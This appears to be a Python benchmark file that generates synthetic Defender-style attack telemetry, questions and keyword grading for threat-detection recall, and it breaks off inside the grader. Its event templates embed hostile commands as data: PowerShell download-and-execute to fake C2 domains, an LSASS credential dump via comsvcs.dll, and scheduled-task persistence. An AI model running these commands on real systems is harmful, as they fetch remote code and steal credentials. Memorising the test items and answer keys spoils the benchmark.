"""Security Log Eval — MDE-style distributed threat detection evaluation.

Generates realistic Microsoft Defender for Endpoint (MDE) telemetry —
process creation events, network connections, file/registry modifications,
and alert chains — distributed across multiple attack campaigns spanning
weeks. The data volume exceeds single-agent memory, requiring the distributed
hive mind graph for full coverage.

Measures precision, recall, and F1 for:
  - Alert retrieval (can the hive find specific alerts?)
  - Attack chain reconstruction (can it link multi-stage attacks?)
  - IOC correlation (can it connect indicators across campaigns?)
  - Temporal reasoning (can it answer timeline questions?)
  - Cross-campaign attribution (same TTP across different incidents?)

Usage (local):
    python -m amplihack.eval.security_log_eval --turns 10000

Usage (distributed, 100 agents):
    python deploy/azure_hive/eval_distributed_security.py \\
        --connection-string "$EH_CONN" --agents 100 --turns 50000
"""

from __future__ import annotations

import hashlib
import json
import logging
import random
import time
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)

# ============================================================
# MDE Telemetry Templates
# ============================================================

MITRE_TECHNIQUES = {
    "T1566.001": "Phishing: Spearphishing Attachment",
    "T1059.001": "Command and Scripting: PowerShell",
    "T1059.003": "Command and Scripting: Windows Command Shell",
    "T1053.005": "Scheduled Task",
    "T1547.001": "Registry Run Keys / Startup Folder",
    "T1003.001": "OS Credential Dumping: LSASS Memory",
    "T1021.001": "Remote Services: RDP",
    "T1021.002": "Remote Services: SMB/Windows Admin Shares",
    "T1021.006": "Remote Services: Windows Remote Management",
    "T1070.001": "Indicator Removal: Clear Windows Event Logs",
    "T1070.004": "Indicator Removal: File Deletion",
    "T1105": "Ingress Tool Transfer",
    "T1027": "Obfuscated Files or Information",
    "T1569.002": "System Services: Service Execution",
    "T1486": "Data Encrypted for Impact",
    "T1048.003": "Exfiltration Over Alternative Protocol: Unencrypted",
    "T1071.001": "Application Layer Protocol: Web Protocols",
    "T1082": "System Information Discovery",
    "T1083": "File and Directory Discovery",
    "T1057": "Process Discovery",
    "T1018": "Remote System Discovery",
    "T1087.002": "Account Discovery: Domain Account",
    "T1560.001": "Archive Collected Data: Archive via Utility",
    "T1036.005": "Masquerading: Match Legitimate Name",
    "T1055.001": "Process Injection: DLL Injection",
    "T1140": "Deobfuscate/Decode Files or Information",
    "T1218.011": "Rundll32",
    "T1543.003": "Create or Modify System Process: Windows Service",
    "T1562.001": "Impair Defenses: Disable or Modify Tools",
    "T1490": "Inhibit System Recovery",
}


def _technique_keyword(technique_id: str) -> str:
    """Return the human-readable keyword used by temporal question grading."""
    return MITRE_TECHNIQUES.get(technique_id, technique_id).split(":")[0].strip()


def _objective_keyword(objective: str) -> str:
    """Return the human-readable keyword used by objective question grading."""
    return objective.replace("_", " ")


# Realistic device names for a 500-device enterprise
DEVICE_POOLS = {
    "workstations": [
        f"WS-{dept}-{i:03d}"
        for dept in ["FIN", "ENG", "MKT", "HR", "EXEC", "IT", "LEGAL"]
        for i in range(1, 16)
    ],
    "servers": [
        f"SRV-{role}-{i:02d}"
        for role in ["DC", "SQL", "WEB", "APP", "FILE", "EXCH", "SCCM", "WSUS"]
        for i in range(1, 6)
    ],
    "domain_controllers": [f"SRV-DC-{i:02d}" for i in range(1, 4)],
}

USERS = [
    ("jsmith", "John Smith", "Finance"),
    ("agarcia", "Ana Garcia", "Engineering"),
    ("mwong", "Michael Wong", "Marketing"),
    ("ljohnson", "Lisa Johnson", "HR"),
    ("rbrown", "Robert Brown", "IT"),
    ("kwilliams", "Karen Williams", "Legal"),
    ("dlee", "David Lee", "Engineering"),
    ("spatel", "Sanjay Patel", "IT"),
    ("jchen", "Jennifer Chen", "Finance"),
    ("tmartin", "Tom Martin", "Executive"),
    ("nkim", "Nancy Kim", "Engineering"),
    ("crodriguez", "Carlos Rodriguez", "IT"),
    ("svc_backup", "Service Account", "IT"),
    ("svc_deploy", "Service Account", "IT"),
    ("admin_spatel", "Sanjay Patel (Admin)", "IT"),
]

C2_DOMAINS = [
    "cdn-static-assets.com",
    "api-telemetry-service.net",
    "cloud-sync-update.com",
    "global-content-delivery.net",
    "secure-update-check.com",
    "analytics-reporting.io",
]

MALWARE_HASHES = {
    "cobalt_strike": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",  # pragma: allowlist secret
    "mimikatz": "d4e5f6a7b8c9d0e1f2a3b4c5d6a7b8c9",  # pragma: allowlist secret
    "ransomware_payload": "f6a7b8c9d0e1f2a3b4c5d6a7b8c9d0e1",  # pragma: allowlist secret
    "keylogger": "b8c9d0e1f2a3b4c5d6a7b8c9d0e1f2a3",  # pragma: allowlist secret
    "lateral_tool": "c9d0e1f2a3b4c5d6a7b8c9d0e1f2a3b4",  # pragma: allowlist secret
}

ALERT_SEVERITIES = ["Informational", "Low", "Medium", "High", "Critical"]


# ============================================================
# Attack Campaign Definitions
# ============================================================


@dataclass
class AttackCampaign:
    """A multi-stage attack campaign with ground truth."""

    campaign_id: str
    name: str
    threat_actor: str
    start_day: int  # day offset from epoch
    duration_days: int
    initial_access: str  # MITRE technique
    techniques: list[str]
    target_devices: list[str]
    target_users: list[str]
    c2_domains: list[str]
    malware_hashes: list[str]
    objective: str  # data exfil, ransomware, espionage
    iocs: dict[str, list[str]]  # type -> values
    lateral_movement_path: list[str]  # device chain
    data_exfil_gb: float
    detected: bool
    detection_delay_hours: int


def _generate_campaigns(rng: random.Random, num_campaigns: int = 12) -> list[AttackCampaign]:
    """Generate deterministic attack campaigns."""
    campaigns = []
    actors = [
        ("APT-BEAR", "Nation-state: Eastern European"),
        ("APT-DRAGON", "Nation-state: East Asian"),
        ("CARBON-SPIDER", "eCrime: Ransomware group"),
        ("SCATTERED-SPIDER", "eCrime: Social engineering"),
        ("VELVET-TYPHOON", "Nation-state: Espionage"),
        ("SANDSTORM-7", "Hacktivist collective"),
    ]

    objectives = ["data_exfiltration", "ransomware", "espionage", "cryptomining", "supply_chain"]

    techniques_by_objective = {
        "data_exfiltration": [
            "T1566.001",
            "T1059.001",
            "T1003.001",
            "T1021.002",
            "T1083",
            "T1560.001",
            "T1048.003",
        ],
        "ransomware": [
            "T1566.001",
            "T1059.003",
            "T1053.005",
            "T1021.001",
            "T1562.001",
            "T1490",
            "T1486",
        ],
        "espionage": [
            "T1566.001",
            "T1059.001",
            "T1055.001",
            "T1003.001",
            "T1087.002",
            "T1018",
            "T1071.001",
        ],
        "cryptomining": ["T1059.001", "T1053.005", "T1543.003", "T1105"],
        "supply_chain": ["T1059.001", "T1036.005", "T1547.001", "T1027", "T1140", "T1218.011"],
    }

    all_devices = DEVICE_POOLS["workstations"] + DEVICE_POOLS["servers"]

    for i in range(num_campaigns):
        actor_name, actor_desc = actors[i % len(actors)]
        objective = objectives[i % len(objectives)]
        techniques = techniques_by_objective[objective]

        num_devices = rng.randint(3, 12)
        target_devices = rng.sample(all_devices, min(num_devices, len(all_devices)))
        num_users = rng.randint(1, 4)
        target_users = [u[0] for u in rng.sample(USERS, min(num_users, len(USERS)))]
        c2 = rng.sample(C2_DOMAINS, rng.randint(1, 3))

        # Generate unique IOCs per campaign
        campaign_hash = hashlib.md5(f"campaign-{i}-{actor_name}".encode()).hexdigest()
        malware = [campaign_hash[:32]]
        ips = [
            f"185.{rng.randint(100, 255)}.{rng.randint(1, 254)}.{rng.randint(1, 254)}"
            for _ in range(rng.randint(2, 5))
        ]

        lateral_path = target_devices[: rng.randint(2, min(5, len(target_devices)))]

        campaigns.append(
            AttackCampaign(
                campaign_id=f"CAMP-{2024 + i // 6}-{i + 1:03d}",
                name=f"Operation {rng.choice(['Midnight', 'Shadow', 'Storm', 'Glacier', 'Phoenix', 'Cobalt', 'Iron', 'Crimson', 'Azure', 'Onyx', 'Jade', 'Ruby'])} {rng.choice(['Wolf', 'Bear', 'Eagle', 'Fox', 'Lion', 'Hawk', 'Viper', 'Falcon'])}",
                threat_actor=f"{actor_name} ({actor_desc})",
                start_day=i * 5 + rng.randint(0, 3),
                duration_days=rng.randint(2, 14),
                initial_access="T1566.001",
                techniques=techniques,
                target_devices=target_devices,
                target_users=target_users,
                c2_domains=c2,
                malware_hashes=malware,
                objective=objective,
                iocs={"ip": ips, "domain": c2, "hash": malware},
                lateral_movement_path=lateral_path,
                data_exfil_gb=round(rng.uniform(0.1, 50.0), 2)
                if objective == "data_exfiltration"
                else 0,
                detected=rng.random() > 0.15,  # 85% detection rate
                detection_delay_hours=rng.randint(1, 72),
            )
        )

    return campaigns


# ============================================================
# MDE Event Generators
# ============================================================


def _mde_process_event(
    rng: random.Random,
    ts: str,
    device: str,
    user: str,
    process: str,
    parent: str,
    cmdline: str,
    technique: str = "",
) -> str:
    """Generate an MDE DeviceProcessEvents record."""
    return (
        f"[MDE DeviceProcessEvents] Timestamp: {ts} | "
        f"DeviceName: {device} | ActionType: ProcessCreated | "
        f"AccountName: {user} | FileName: {process} | "
        f"ProcessCommandLine: {cmdline} | "
        f"InitiatingProcessFileName: {parent} | "
        f"SHA256: {hashlib.sha256(f'{process}-{ts}'.encode()).hexdigest()[:64]}"
        + (f" | MitreTechniques: {technique}" if technique else "")
    )


def _mde_network_event(
    rng: random.Random,
    ts: str,
    device: str,
    remote_ip: str,
    remote_port: int,
    protocol: str = "TCP",
    action: str = "ConnectionSuccess",
) -> str:
    """Generate an MDE DeviceNetworkEvents record."""
    return (
        f"[MDE DeviceNetworkEvents] Timestamp: {ts} | "
        f"DeviceName: {device} | ActionType: {action} | "
        f"RemoteIP: {remote_ip} | RemotePort: {remote_port} | "
        f"Protocol: {protocol} | "
        f"LocalPort: {rng.randint(49152, 65535)}"
    )


def _mde_file_event(
    rng: random.Random,
    ts: str,
    device: str,
    user: str,
    filename: str,
    action: str = "FileCreated",
    sha256: str = "",
) -> str:
    """Generate an MDE DeviceFileEvents record."""
    h = sha256 or hashlib.sha256(f"{filename}-{ts}".encode()).hexdigest()[:64]
    return (
        f"[MDE DeviceFileEvents] Timestamp: {ts} | "
        f"DeviceName: {device} | ActionType: {action} | "
        f"AccountName: {user} | FileName: {filename} | SHA256: {h}"
    )


def _mde_registry_event(
    ts: str, device: str, key: str, value: str, action: str = "RegistryValueSet"
) -> str:
    """Generate an MDE DeviceRegistryEvents record."""
    return (
        f"[MDE DeviceRegistryEvents] Timestamp: {ts} | "
        f"DeviceName: {device} | ActionType: {action} | "
        f"RegistryKey: {key} | RegistryValueName: {value}"
    )


def _mde_alert(
    ts: str,
    device: str,
    title: str,
    severity: str,
    category: str,
    technique: str = "",
    alert_id: str = "",
) -> str:
    """Generate an MDE AlertInfo record."""
    return (
        f"[MDE AlertInfo] Timestamp: {ts} | "
        f"AlertId: {alert_id or hashlib.md5(f'{title}-{ts}'.encode()).hexdigest()[:16]} | "
        f"DeviceName: {device} | Title: {title} | "
        f"Severity: {severity} | Category: {category}"
        + (f" | MitreTechniques: {technique}" if technique else "")
    )


def _mde_logon_event(
    ts: str, device: str, user: str, logon_type: str = "Interactive", success: bool = True
) -> str:
    """Generate an MDE DeviceLogonEvents record."""
    action = "LogonSuccess" if success else "LogonFailed"
    return (
        f"[MDE DeviceLogonEvents] Timestamp: {ts} | "
        f"DeviceName: {device} | ActionType: {action} | "
        f"AccountName: {user} | LogonType: {logon_type}"
    )


def _mde_threat_intel_event(ts: str, device: str, campaign_id: str, threat_actor: str) -> str:
    """Generate an MDE AlertInfo-style threat-attribution record."""
    return (
        f"[MDE AlertInfo] Timestamp: {ts} | "
        f"AlertId: ATTR-{campaign_id} | DeviceName: {device} | "
        f"Title: Threat intelligence links activity to {threat_actor} | "
        f"Severity: Medium | Category: ThreatIntelligence | "
        f"CampaignId: {campaign_id} | ThreatActor: {threat_actor}"
    )


def _mde_campaign_summary_event(ts: str, device: str, campaign: AttackCampaign) -> str:
    """Generate a campaign-summary enrichment record for benchmark-facing semantics."""
    actor_name = campaign.threat_actor.split("(")[0].strip()
    technique_sequence = " -> ".join(_technique_keyword(t) for t in campaign.techniques[:4])
    ioc_ips = ", ".join(campaign.iocs["ip"][:2])
    ioc_hashes = ", ".join(campaign.malware_hashes[:1])
    return (
        f"[MDE AlertInfo] Timestamp: {ts} | "
        f"AlertId: SUM-{campaign.campaign_id} | DeviceName: {device} | "
        f"Title: Campaign intelligence summary for {campaign.campaign_id} | "
        f"Severity: Medium | Category: ThreatIntelligence | "
        f"CampaignId: {campaign.campaign_id} | ThreatActor: {actor_name} | "
        f"Objective: {_objective_keyword(campaign.objective)} | "
        f"IOC_IPs: {ioc_ips} | IOC_Hashes: {ioc_hashes} | "
        f"TechniqueSequence: {technique_sequence}"
    )


# ============================================================
# Campaign Event Generation
# ============================================================


def _ts(day: int, hour: int, minute: int, second: int = 0) -> str:
    """Generate a timestamp string."""
    return f"2024-{(day // 30) + 3:02d}-{(day % 30) + 1:02d} {hour:02d}:{minute:02d}:{second:02d}"


def _generate_campaign_events(rng: random.Random, campaign: AttackCampaign) -> list[dict]:
    """Generate all MDE events for a campaign with ground truth."""
    events = []
    day = campaign.start_day
    devices = campaign.target_devices
    users = campaign.target_users
    primary_device = devices[0]
    primary_user = users[0]
    actor_name = campaign.threat_actor.split("(")[0].strip()

    # Phase 1: Initial Access (phishing)
    ts = _ts(day, rng.randint(8, 10), rng.randint(0, 59))
    events.append(
        {
            "content": _mde_process_event(
                rng,
                ts,
                primary_device,
                primary_user,
                "outlook.exe",
                "explorer.exe",
                f'"C:\\Program Files\\Microsoft Office\\outlook.exe" /eml invoice_{campaign.campaign_id}.msg',
                "T1566.001",
            ),
            "phase": "initial_access",
            "campaign_id": campaign.campaign_id,
            "technique": "T1566.001",
            "facts": [
                f"{campaign.campaign_id} initial access via phishing on {primary_device} by {primary_user}"
            ],
        }
    )

    # Malicious attachment execution
    ts = _ts(day, rng.randint(10, 11), rng.randint(0, 30))
    macro_file = rng.choice(["invoice.xlsm", "report.docm", "contract.xlsm"])
    events.append(
        {
            "content": _mde_process_event(
                rng,
                ts,
                primary_device,
                primary_user,
                "excel.exe" if "xls" in macro_file else "winword.exe",
                "outlook.exe",
                f'"C:\\Users\\{primary_user}\\Downloads\\{macro_file}"',
            ),
            "phase": "initial_access",
            "campaign_id": campaign.campaign_id,
            "technique": "T1566.001",
            "facts": [f"{campaign.campaign_id} malicious macro executed from {macro_file}"],
        }
    )

    # Phase 2: Execution (PowerShell/cmd)
    ts = _ts(day, rng.randint(11, 12), rng.randint(0, 59))
    if "T1059.001" in campaign.techniques:
        ps_cmd = rng.choice(
            [
                "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcA",
                "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString",
                f"powershell.exe -c Invoke-WebRequest -Uri https://{campaign.c2_domains[0]}/update.ps1",
            ]
        )
        events.append(
            {
                "content": _mde_process_event(
                    rng,
                    ts,
                    primary_device,
                    primary_user,
                    "powershell.exe",
                    "excel.exe",
                    ps_cmd,
                    "T1059.001",
                ),
                "phase": "execution",
                "campaign_id": campaign.campaign_id,
                "technique": "T1059.001",
                "facts": [f"{campaign.campaign_id} PowerShell execution on {primary_device}"],
            }
        )

    # C2 connection
    ts = _ts(day, rng.randint(12, 13), rng.randint(0, 59))
    c2_ip = campaign.iocs["ip"][0]
    events.append(
        {
            "content": _mde_network_event(rng, ts, primary_device, c2_ip, 443),
            "phase": "c2",
            "campaign_id": campaign.campaign_id,
            "technique": "T1071.001",
            "facts": [f"{campaign.campaign_id} C2 connection from {primary_device} to {c2_ip}:443"],
        }
    )

    # File drop
    ts = _ts(day, rng.randint(13, 14), rng.randint(0, 59))
    malware_name = rng.choice(
        ["svchost_update.exe", "wuauserv.dll", "taskhost_x64.exe", "dllhost_srv.exe"]
    )
    events.append(
        {
            "content": _mde_file_event(
                rng,
                ts,
                primary_device,
                primary_user,
                f"C:\\ProgramData\\{malware_name}",
                sha256=campaign.malware_hashes[0],
            ),
            "phase": "execution",
            "campaign_id": campaign.campaign_id,
            "technique": "T1105",
            "facts": [
                f"{campaign.campaign_id} dropped malware {malware_name} hash {campaign.malware_hashes[0][:16]} on {primary_device}",
            ],
        }
    )

    # Alert for initial compromise
    if campaign.detected:
        alert_ts = _ts(day, rng.randint(14, 18), rng.randint(0, 59))
        events.append(
            {
                "content": _mde_alert(
                    alert_ts,
                    primary_device,
                    "Suspicious PowerShell execution detected",
                    "High",
                    "Execution",
                    "T1059.001",
                    alert_id=f"ALT-{campaign.campaign_id}-001",
                ),
                "phase": "detection",
                "campaign_id": campaign.campaign_id,
                "technique": "T1059.001",
                "facts": [
                    f"{campaign.campaign_id} alert ALT-{campaign.campaign_id}-001 on {primary_device}"
                ],
            }
        )

    # Phase 3: Persistence
    day += 1
    ts = _ts(day, rng.randint(2, 5), rng.randint(0, 59))
    if "T1547.001" in campaign.techniques:
        events.append(
            {
                "content": _mde_registry_event(
                    ts,
                    primary_device,
                    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                    malware_name,
                ),
                "phase": "persistence",
                "campaign_id": campaign.campaign_id,
                "technique": "T1547.001",
                "facts": [
                    f"{campaign.campaign_id} persistence via Run key for {malware_name} on {primary_device}"
                ],
            }
        )
    elif "T1053.005" in campaign.techniques:
        events.append(
            {
                "content": _mde_process_event(
                    rng,
                    ts,
                    primary_device,
                    "SYSTEM",
                    "schtasks.exe",
                    malware_name,
                    f'schtasks /create /tn "WindowsUpdate" /tr "C:\\ProgramData\\{malware_name}" /sc hourly',
                    "T1053.005",
                ),
                "phase": "persistence",
                "campaign_id": campaign.campaign_id,
                "technique": "T1053.005",
                "facts": [f"{campaign.campaign_id} scheduled task persistence on {primary_device}"],
            }
        )

    # Phase 4: Credential Access
    if "T1003.001" in campaign.techniques:
        day += rng.randint(0, 1)
        ts = _ts(day, rng.randint(1, 4), rng.randint(0, 59))
        events.append(
            {
                "content": _mde_process_event(
                    rng,
                    ts,
                    primary_device,
                    "SYSTEM",
                    "rundll32.exe",
                    malware_name,
                    "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\ProgramData\\lsass.dmp full",
                    "T1003.001",
                ),
                "phase": "credential_access",
                "campaign_id": campaign.campaign_id,
                "technique": "T1003.001",
                "facts": [f"{campaign.campaign_id} LSASS credential dump on {primary_device}"],
            }
        )
        if campaign.detected:
            events.append(
                {
                    "content": _mde_alert(
                        ts,
                        primary_device,
                        "Suspicious LSASS access detected",
                        "Critical",
                        "CredentialAccess",
                        "T1003.001",
                        alert_id=f"ALT-{campaign.campaign_id}-002",
                    ),
                    "phase": "detection",
                    "campaign_id": campaign.campaign_id,
                    "technique": "T1003.001",
                    "facts": [f"{campaign.campaign_id} credential dump alert on {primary_device}"],
                }
            )

    # Phase 5: Lateral Movement
    for hop_idx, hop_device in enumerate(campaign.lateral_movement_path[1:], 1):
        day += rng.randint(0, 2)
        ts = _ts(day, rng.randint(0, 6), rng.randint(0, 59))

        if "T1021.002" in campaign.techniques:
            technique = "T1021.002"
            events.append(
                {
                    "content": _mde_logon_event(ts, hop_device, primary_user, "RemoteInteractive"),
                    "phase": "lateral_movement",
                    "campaign_id": campaign.campaign_id,
                    "technique": technique,
                    "facts": [
                        f"{campaign.campaign_id} lateral movement to {hop_device} via SMB (hop {hop_idx})"
                    ],
                }
            )
        elif "T1021.001" in campaign.techniques:
            technique = "T1021.001"
            events.append(
                {
                    "content": _mde_logon_event(ts, hop_device, primary_user, "RemoteInteractive"),
                    "phase": "lateral_movement",
                    "campaign_id": campaign.campaign_id,
                    "technique": technique,
                    "facts": [
                        f"{campaign.campaign_id} lateral movement to {hop_device} via RDP (hop {hop_idx})"
                    ],
                }
            )

        # Drop tools on lateral hop
        events.append(
            {
                "content": _mde_file_event(
                    rng,
                    ts,
                    hop_device,
                    primary_user,
                    f"C:\\Windows\\Temp\\{malware_name}",
                    sha256=campaign.malware_hashes[0],
                ),
                "phase": "lateral_movement",
                "campaign_id": campaign.campaign_id,
                "technique": "T1105",
                "facts": [f"{campaign.campaign_id} malware deployed on {hop_device}"],
            }
        )

    # Phase 6: Objective
    day += rng.randint(1, 3)
    if campaign.objective == "ransomware":
        ts = _ts(day, rng.randint(0, 3), rng.randint(0, 59))
        for dev in devices[: rng.randint(2, min(5, len(devices)))]:
            events.append(
                {
                    "content": _mde_alert(
                        ts,
                        dev,
                        "Ransomware behavior detected: mass file encryption",
                        "Critical",
                        "Impact",
                        "T1486",
                        alert_id=f"ALT-{campaign.campaign_id}-R{devices.index(dev)}",
                    ),
                    "phase": "impact",
                    "campaign_id": campaign.campaign_id,
                    "technique": "T1486",
                    "facts": [f"{campaign.campaign_id} ransomware encryption on {dev}"],
                }
            )
    elif campaign.objective == "data_exfiltration":
        ts = _ts(day, rng.randint(1, 4), rng.randint(0, 59))
        events.append(
            {
                "content": _mde_network_event(rng, ts, devices[-1], campaign.iocs["ip"][-1], 443)
                + f" | BytesSent: {int(campaign.data_exfil_gb * 1073741824)}",
                "phase": "exfiltration",
                "campaign_id": campaign.campaign_id,
                "technique": "T1048.003",
                "facts": [
                    f"{campaign.campaign_id} exfiltrated {campaign.data_exfil_gb}GB from {devices[-1]}"
                ],
            }
        )
    elif campaign.objective == "espionage":
        ts = _ts(day, rng.randint(1, 4), rng.randint(0, 59))
        events.append(
            {
                "content": _mde_process_event(
                    rng,
                    ts,
                    primary_device,
                    primary_user,
                    "7z.exe",
                    malware_name,
                    f"7z.exe a -p C:\\ProgramData\\data.7z C:\\Users\\{primary_user}\\Documents\\*",
                    "T1560.001",
                ),
                "phase": "collection",
                "campaign_id": campaign.campaign_id,
                "technique": "T1560.001",
                "facts": [f"{campaign.campaign_id} data collection/archival on {primary_device}"],
            }
        )

    # Threat-intelligence enrichment: explicit campaign attribution so
    # actor-based cross-campaign questions are answerable from telemetry.
    ts = _ts(day, rng.randint(4, 6), rng.randint(0, 59))
    events.append(
        {
            "content": _mde_threat_intel_event(
                ts,
                primary_device,
                campaign.campaign_id,
                actor_name,
            ),
            "phase": "attribution",
            "campaign_id": campaign.campaign_id,
            "technique": "",
            "facts": [f"{campaign.campaign_id} threat actor {actor_name}"],
        }
    )

    summary_ts = _ts(day, 6, 30)
    technique_keywords = [_technique_keyword(t) for t in campaign.techniques[:4]]
    events.append(
        {
            "content": _mde_campaign_summary_event(summary_ts, primary_device, campaign),
            "phase": "summary",
            "campaign_id": campaign.campaign_id,
            "technique": "",
            "facts": [
                f"{campaign.campaign_id} objective {_objective_keyword(campaign.objective)}",
                f"{campaign.campaign_id} IOCs {' '.join(campaign.iocs['ip'][:2])} {campaign.malware_hashes[0][:16]}",
                f"{campaign.campaign_id} technique sequence {' -> '.join(technique_keywords)}",
            ],
        }
    )

    # Add noise events (benign activity on same devices)
    for _ in range(rng.randint(5, 15)):
        noise_day = campaign.start_day + rng.randint(0, campaign.duration_days)
        noise_ts = _ts(noise_day, rng.randint(8, 17), rng.randint(0, 59))
        noise_device = rng.choice(devices)
        noise_user = rng.choice(USERS)[0]
        benign_processes = [
            ("chrome.exe", "explorer.exe", "chrome.exe --type=renderer"),
            ("teams.exe", "explorer.exe", "teams.exe --type=utility"),
            ("code.exe", "explorer.exe", "code.exe ."),
            ("svchost.exe", "services.exe", "svchost.exe -k netsvcs -p"),
            ("notepad.exe", "explorer.exe", f"notepad.exe C:\\Users\\{noise_user}\\notes.txt"),
        ]
        proc, parent, cmd = rng.choice(benign_processes)
        events.append(
            {
                "content": _mde_process_event(
                    rng, noise_ts, noise_device, noise_user, proc, parent, cmd
                ),
                "phase": "noise",
                "campaign_id": campaign.campaign_id,
                "technique": "",
                "facts": [],
            }
        )

    return events


# ============================================================
# Background Noise Generator
# ============================================================


def _generate_noise_events(rng: random.Random, num_events: int, num_days: int) -> list[dict]:
    """Generate benign MDE telemetry (normal enterprise activity)."""
    all_devices = DEVICE_POOLS["workstations"] + DEVICE_POOLS["servers"]
    events = []

    benign_templates = [
        ("chrome.exe", "explorer.exe", "chrome.exe --type=renderer --field-trial-handle=12345"),
        (
            "msedge.exe",
            "explorer.exe",
            "msedge.exe --single-argument https://sharepoint.contoso.com",
        ),
        ("teams.exe", "explorer.exe", "teams.exe --type=gpu-process"),
        ("outlook.exe", "explorer.exe", "outlook.exe /recycle"),
        ("code.exe", "explorer.exe", "code.exe --unity-launch"),
        ("python.exe", "cmd.exe", "python.exe manage.py runserver"),
        ("node.exe", "cmd.exe", "node.exe server.js"),
        ("svchost.exe", "services.exe", "svchost.exe -k netsvcs -p -s Themes"),
        ("WindowsUpdate.exe", "svchost.exe", "WindowsUpdate.exe /detectnow"),
        ("MsMpEng.exe", "services.exe", "MsMpEng.exe"),  # Defender
    ]

    for _ in range(num_events):
        day = rng.randint(0, num_days)
        hour = rng.randint(6, 22)
        minute = rng.randint(0, 59)
        ts = _ts(day, hour, minute, rng.randint(0, 59))
        device = rng.choice(all_devices)
        user = rng.choice(USERS)[0]
        proc, parent, cmd = rng.choice(benign_templates)

        events.append(
            {
                "content": _mde_process_event(rng, ts, device, user, proc, parent, cmd),
                "phase": "noise",
                "campaign_id": "BENIGN",
                "technique": "",
                "facts": [],
            }
        )

    return events


# ============================================================
# Question Generation
# ============================================================


@dataclass
class SecurityQuestion:
    """A question with ground truth for grading."""

    question_id: str
    question: str
    category: str  # alert_retrieval, attack_chain, ioc_correlation, temporal, cross_campaign
    ground_truth_facts: list[str]
    required_keywords: list[str]
    campaign_ids: list[str]
    difficulty: str  # easy, medium, hard


def _generate_questions(
    campaigns: list[AttackCampaign], rng: random.Random, num_questions: int = 100
) -> list[SecurityQuestion]:
    """Generate questions testing distributed retrieval capabilities."""
    questions: list[SecurityQuestion] = []
    qid = 0

    for camp in campaigns:
        # Alert retrieval (easy — single fact lookup)
        qid += 1
        questions.append(
            SecurityQuestion(
                question_id=f"SEC-{qid:04d}",
                question=f"What devices were targeted in campaign {camp.campaign_id}?",
                category="alert_retrieval",
                ground_truth_facts=[f"{camp.campaign_id} " + d for d in camp.target_devices],
                required_keywords=camp.target_devices[:3],
                campaign_ids=[camp.campaign_id],
                difficulty="easy",
            )
        )

        # Attack chain reconstruction (medium — multi-hop)
        qid += 1
        questions.append(
            SecurityQuestion(
                question_id=f"SEC-{qid:04d}",
                question=f"Describe the lateral movement path in campaign {camp.campaign_id}. "
                f"Which devices were compromised in order?",
                category="attack_chain",
                ground_truth_facts=[
                    f"{camp.campaign_id} lateral movement to {d}"
                    for d in camp.lateral_movement_path[1:]
                ],
                required_keywords=camp.lateral_movement_path[:3],
                campaign_ids=[camp.campaign_id],
                difficulty="medium",
            )
        )

        # IOC correlation (medium — connect indicators)
        qid += 1
        questions.append(
            SecurityQuestion(
                question_id=f"SEC-{qid:04d}",
                question=f"What are the IOCs (IP addresses and file hashes) associated with campaign {camp.campaign_id}?",
                category="ioc_correlation",
                ground_truth_facts=[
                    f"{camp.campaign_id} C2 connection to {ip}" for ip in camp.iocs["ip"][:2]
                ],
                required_keywords=camp.iocs["ip"][:2] + [camp.malware_hashes[0][:16]],
                campaign_ids=[camp.campaign_id],
                difficulty="medium",
            )
        )

        # Temporal reasoning (hard — timeline)
        qid += 1
        questions.append(
            SecurityQuestion(
                question_id=f"SEC-{qid:04d}",
                question=f"What was the sequence of MITRE ATT&CK techniques used in campaign {camp.campaign_id}? "
                f"List them in chronological order.",
                category="temporal",
                ground_truth_facts=[
                    f"{camp.campaign_id} technique {t}" for t in camp.techniques[:4]
                ],
                required_keywords=[_technique_keyword(t) for t in camp.techniques[:3]],
                campaign_ids=[camp.campaign_id],
                difficulty="hard",
            )
        )

        # Objective identification
        qid += 1
        questions.append(
            SecurityQuestion(
                question_id=f"SEC-{qid:04d}",
                question=f"What was the objective of campaign {camp.campaign_id}? "
                f"Was it ransomware, data exfiltration, espionage, or something else?",
                category="alert_retrieval",
                ground_truth_facts=[f"{camp.campaign_id} objective: {camp.objective}"],
                required_keywords=[_objective_keyword(camp.objective)],
                campaign_ids=[camp.campaign_id],
                difficulty="easy",
            )
        )

    # Cross-campaign questions (hard — connect multiple campaigns)
    actors_used = {}
    for camp in campaigns:
        actor_key = camp.threat_actor.split("(")[0].strip()
        actors_used.setdefault(actor_key, []).append(camp)

    for actor, actor_campaigns in actors_used.items():
        if len(actor_campaigns) >= 2:
            qid += 1
            camp_ids = [c.campaign_id for c in actor_campaigns[:3]]
            questions.append(
                SecurityQuestion(
                    question_id=f"SEC-{qid:04d}",
                    question=f"Which campaigns are attributed to {actor}? "
                    f"What common techniques did they use across campaigns?",
                    category="cross_campaign",
                    ground_truth_facts=[f"{cid} threat actor {actor}" for cid in camp_ids],
                    required_keywords=camp_ids[:2],
                    campaign_ids=camp_ids,
                    difficulty="hard",
                )
            )

    # Device-centric questions
    device_campaigns: dict[str, list[str]] = {}
    for camp in campaigns:
        for dev in camp.target_devices:
            device_campaigns.setdefault(dev, []).append(camp.campaign_id)
    for dev, cids in device_campaigns.items():
        if len(cids) >= 2:
            qid += 1
            questions.append(
                SecurityQuestion(
                    question_id=f"SEC-{qid:04d}",
                    question=f"Device {dev} was compromised in multiple campaigns. "
                    f"Which campaigns affected this device and what happened?",
                    category="cross_campaign",
                    ground_truth_facts=[f"campaign on {dev}" for _ in cids],
                    required_keywords=cids[:2],
                    campaign_ids=cids,
                    difficulty="hard",
                )
            )
            if len(questions) >= num_questions:
                break

    rng.shuffle(questions)
    return questions[:num_questions]


# ============================================================
# Grading
# ============================================================


@dataclass
class SecurityGradeResult:
    """Grading result for a single question."""

    question_id: str
    category: str
    score: float  # 0.0 - 1.0
    precision: float
    recall: float
    f1: float
    matched_keywords: list[str]
    missing_keywords: list[str]
    answer_excerpt: str


def _grade_answer(question: SecurityQuestion, answer: str) -> SecurityGradeResult:
    """Grade an answer using keyword matching + partial credit."""
    answer_lower = answer.lower()
    matched = []
    missing = []

    for kw in question.required_keywords:
